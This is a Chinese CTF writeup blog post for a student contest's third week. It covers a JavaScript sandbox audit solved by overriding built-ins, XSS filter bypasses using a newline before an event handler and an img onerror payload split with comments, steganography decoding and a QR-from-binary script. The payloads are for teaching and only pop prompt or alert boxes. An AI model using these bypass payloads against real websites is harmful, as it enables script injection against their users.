title: hctf_game_week3_writeup
date: 2016-02-29 11:25:35
tags:
- Blogs
- ctf
categories:
- Blogs
---

假期难得有时间空闲下来，就和协会的小伙伴组织了一次比较简单的ctf比赛针对学校的学弟学妹们，这里就贴上每一次的writeup，以供整理复习用。

<!--more-->

## WEB

### 代码审计:Javascript魔法师	    POINT: 200
本题题解详情 
题目ID： 66
题目描述： 代码审计:Javascript魔法师 nc 114.215.155.190 10009 
Hint: 源码（如果你想黑盒的话可以忽略）：https://gist.github.com/iAklis/2770f07540b6ddfc1d66

说实话的话我感觉题目非常的难，开始试验了很久都失败了，后来问了ak老司机才知道是怎么做的。
首先对于js的大段代码，分析起来谁都会感觉到很麻烦。
```
function (urandom) {

    function step1(){                              //2028 done
        var a = new Date();
        var b = Number(a.getFullYear());
        t = 0;
        for (var i = 0; i < b.length;	i++ ){
            t += parseInt();
        }
        var c = String(a.getFullYear());
        for (var i = 0; i < c.length; i++ ){
            t += b % 10;
            b = b / 10;
        }
        var b = Number(a.getFullYear());
        if (!(b%400===0 || b%100!=0 && b%4===0))
            return false;
        if (!(t > 11 & t < 27))
            return false;

        return true;
    }

    function step2() {                            //a.concat
        var a = Array.apply(null, new Array(Math.floor(Math.random() * 20 + 12) + 10)).map(function () {return Math.random() * 0x10000;});
        var b = urandom(a.length);

        if (!Array.isArray(b)) {
            return false;
        }

        if (b.length < a.length) {
            for (var i = 0, n = a.length - b.length; i < n; i++) {
                delete b[b.length];
                b[b.length] = [Math.random() * 0x10000];
            }
        } else if (b.length > a.length) {
            for (var i = 0, n = b.length - a.length; i < n; i++)
                Array.prototype.pop.apply(b);
        }

        for (var i = 0, n = b.length; i < n; i++) {
            if (a[i] != b[i]) {
                return false;
            }
        }

        return true;
    }

    function step3() {
        var a = Array.apply(null, new Array((urandom() % 20 + 12) + 10)).map(function () {return urandom() % 0x10000;});
        var b = urandom(a.length);

        if (!Array.isArray(b)) {
            return false;
        }

        if (b.length < a.length) {
            for (var i = 0, n = a.length - b.length; i < n; i++) {
                delete b[b.length];
                b[b.length] = [Math.random() * 0x10000];
            }
        } else if (b.length > a.length) {
            for (var i = 0, n = b.length - a.length; i < n; i++)
                Array.prototype.pop.apply(b);
        }

        for (var i = 0, n = b.length; i < n; i++) {
            if (a[i] != b[i]) {
                return false;
            }
        }

        return true;
    }



    if (!step1())
        return "Thinkphp!";

    if (!step2())
        return "Yiiii~";

    if (!step3())
        return "Laravel!";

    return flag;
```
而对于这样的js审计题目来说，firefox firebug的控制台绝对是第一神器，例如我们可以先把step1（）复制下来，然后把函数去掉，把return改为有意义的alert，然后其中多步的变量通过console.log或者document.write的方法输出多来测试。
就比如在我最开始的测试中，2028年就可以过第一步，但是实际题目在服务器环境下，可我们总不能等到2028年才做题，所以这里其实是通过重写函数的方式来过判断的。

payload：
`echo 'Array.apply=function(){return [];};function urandom(){return [];}function Date(){this.getFullYear=function(){return 1924;}}'| nc aklis.yun 10009`
仔细研究下吧。


### WEB从0开始之xss challenge2	    POINT: 150
本题题解详情 
题目ID： 58
题目描述： http://115.28.78.16/xss/xss2/index.php 
1、成功执行prompt(1).
2、payload必须对下述浏览器有效： Chrome(最新版) - Firefox(最新版)
3、将有效payload发送给qq578168406(LoRexxar)或者大飞客获取flag

这道题的原题也是prompt(1)挑战赛的题目，本来的payload是这样的：
```
"type=image src onerror
="prompt(1)
```
但是上次有人说我出了原题，有心人一搜就能找到payload，所以我就把原答案中给过滤了，结果没想到没办法在不交户的情况下完成弹窗，于是我本以为考的方向不变，我这里的payload是这样的：
```
"type="button
" onclick
="prompt(1)
```
结果其实改成onclick的话，无论是什么type都无所谓了，这样其实少了一个考点，不过既然已经降了难度就算了，可惜还是只有2个人给我提交了payload，是这样的
```
" onclick
="prompt(1)
```

仔细阅读源码发现2点：
1、首先是过滤，把onxxxx=这样的替换为_,这里用一个回车绕过。
2、其次是第二点，就是后面的type不可以覆盖前面的，所以可以把type=image。（当然由于失误，这个已经不重要了）

### WEB从0开始之xss challenge3	    POINT: 200
本题题解详情 
题目ID： 59
题目描述： http://115.28.78.16/xss/xss3/index.php 
1、成功执行prompt(1).
2、payload不需要用户交互
3、payload必须对下述浏览器有效： Chrome(最新版) - Firefox(最新版)
4、将有效payload发送给qq578168406(LoRexxar)或者大飞客获取flag

题目是来自prompt(1)挑战赛的level7，仔细阅读源码后发现，题目的原意是根据#分离，每一部分赋给一个title，如果超过12字符，则需要截取前12个，这里使用的是js注释，使代码连起来。

稍微测试一下，发现注释之间是会出现空格的，script,on+xxx,prompt这样的中间出现空格会无效，所以script这样的加payload会溢出12个符号，所以原题的payload是：
```
"><svg/a=#"onload='/*#*/prompt(1)'
```
这样就形成
```
<p class="comment" title=""><svg/a="></p>
<p class="comment" title=""onload='/*"></p>
<p class="comment" title="*/prompt(1)'"></p>
```
这里不能使用/**/闭合第一行和第二行之间的东西，是因为SVG文件中可以通过任意元素的onload事件执行Javascript,且不需要用户交互。
但是svg被我过滤了，其实img的onerror属性和svg能起到相同的作用，于是我的payload是:
```
"><img/src=#"onerror='/*#*/prompt(1)'
```
成功弹窗。

## misc

###  MISC 驾驶技术科目五	    POINT: 250 DONE 
本题题解详情
题目ID： 40
题目描述： 注意路况，看仔细点啊！小伙子们！刹车啊刹车！！！ 让我下车！让我下车！！
Hint: 暂无HINT

科目五的入口在科目四的下载里面，打开发现是一张图片，这题真的是卡了很久很久，后来看了spine的writeup才明白是lsb隐写，用stegsolves打开图片，点开data extract，勾上rgb的0，可以看到一串base64编码过的东西，拿去解解看发现不可见，去问了老司机知道是zlib加密，那么，开始写代码吧。
```
import zlib
import binascii
import base64
aa = "eF6NkEFWw0AMQ8+SGyTHYAVXgL7SrrrgwYY+7k78JTmGBY9J05mxJVnK9fT+ej+/XdaPz+v59vJ8uyzL8vT4sK/98LX9Y61a27buv3r1z41FZ197IwhA1UpHhZThBA4Uah9MdKGavyCS1eA0G2IvodnY4bJ9g/j54DrqlUm+pDEbI0B5ryttXPDyTbLQGRmFELE51ihL1mSPVNBoBsTue06DH1MQuHi3y2KWhOQ0YcLohqY5niYGogCwaYtWlbL6hTFOI5vjLBgjipaFVYPdjZHEVQI4Q9uIKWdoRLAWhKunIDHhU11lHX2qh9KRmlYA8kLBdZlqa8WzDpIzeH08vgl1/VGrR1W4gtTB47TBlkZPzzgrD2osas70YuPWF64FE0cpbHIk6oHxUgnlXlGkLqMEJZFTWa+2pAH5x/oGmlvynQ=="
aa = base64.b64decode(aa)
#print base64.b64encode(aa)
result = binascii.hexlify(zlib.decompress(aa))
result = result.decode('hex')
print result
```
解出来时31字符串，一眼看穿是要再解一次hex，于是get flag！


###  MISC 驾驶技术科目六	    POINT: 100 DONE 
本题题解详情
题目ID： 41
题目描述： 过了这一关，就又有一位新司机诞生了！

科目系列到了这里就很简单了，看到一大堆01字符串，看下长度是1225，除不开8，能开根号，那就很清楚了。
要把01转化为二维码了，那么开始写代码吧。
```

from PIL import Image

pic = Image.new("RGB",(35, 35))
aa = "1111111111111111111111111111111111110000000110110011010011001100000001101111101011001101101000001011111011010001010000000110010110010100010110100010110001011101000100101000101101000101011111110111010001010001011011111010010100011101011110111110110000000101010101010101010100000001111111111001101011010100111111111111001011001101111000011100010001001111111111111001100110100010100100101111010001000110000110101101111011011001111110111101011111010110110101111101010111110110110111101000111001101000011010000101000101110010101011001111000011010000110010001101001111011111010010110100000001110011011110111100100010100000010001000111011001000111001111010111010011111111111000000000111100010111111100100001101001011111010100101100011011110011100111001000010010110101001010111111010101010100100001111110000111001100100000101000010100101101110011011101000101000011001010001001000100110110110111101100010100110000011111111111111011010000010000101110101011000000010110100010111001010100101110111110111001000101100010111011011101000101100100100100001100000111111010001010111000010011001000100110110100010110000100010100110011000101101111101001101100011101001000111111000000010111011010100001010001101111111111111111111111111111111111111"

i=0
for y in range (0,35):
	for x in range(0,35):
		if(aa[i] == '0'):
			pic.putpixel([x,y],(0, 0, 0))
		else:
			pic.putpixel([x,y],(255,255,255))
		i = i+1

pic.show()
pic.save("flag.png")
```
扫一扫上车。


## pentest

###  lightless&aklis的渗透教室-4	    POINT: 100 DONE 
本题题解详情
题目ID： 65
题目描述： http://120.27.53.238/pentest/04/encodeanddecode.php
Hint: 暂无HINT

我觉得要求比较清晰，有一个理解上的坑有点儿麻烦，就是每次发送的请求会自动有一次url的decode，所以如果要发送指定的东西，你需要先按照所需编码一次，再全部url的encode，这样服务器会受到正确的请求。
收到这样的东西就get flag了，多试试看！
```
string(52) "&lt;script&gt;x=alert;x('lightless');&lt;/script&gt;"
string(62) "%3Cscript%3Ex%3Dalert%3Bx%28%27lightless%27%29%3B%3C/script%3E"
```
